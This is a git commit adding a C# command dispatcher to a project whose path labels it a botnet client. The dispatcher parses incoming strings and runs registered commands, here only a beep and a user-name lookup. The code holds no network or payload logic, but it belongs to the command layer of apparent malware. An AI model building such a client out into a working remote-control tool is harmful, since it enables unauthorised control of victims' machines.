1ed69efdfbdfa7f62df7ccf283985f71fb76eab9
O_Riley <86636387+Randumbdude@users.noreply.github.com>
2023-04-16 17:18:57 -0500

    Cmd System

---
+++ Botnet/Client/Commands/CommandHandler.cs
@@ -0,0 +1,35 @@
+﻿using System.Collections.Generic;
+using System.Linq;
+
+namespace Client.Commands
+{
+    class CommandHandler
+    {
+        List<Command> commands;
+
+        public CommandHandler()
+        {
+            this.commands = new List<Command>();
+
+            this.commands.Add(new Beep("beep"));
+            this.commands.Add(new GetUserName("getname"));
+        }
+
+        public string runCommand(string cmd)
+        {
+            string[] sp = cmd.Split(' ');
+            string name = sp.First();
+            string[] args = sp.Skip(1).ToArray();
+
+            foreach (Command c in this.commands)
+            {
+                if (c.name.ToLower() == name)
+                {
+                    return c.execute(args);
+                }
+            }
+
+            return $"Command \"{cmd}\" does not exist";
+        }
+    }
+}
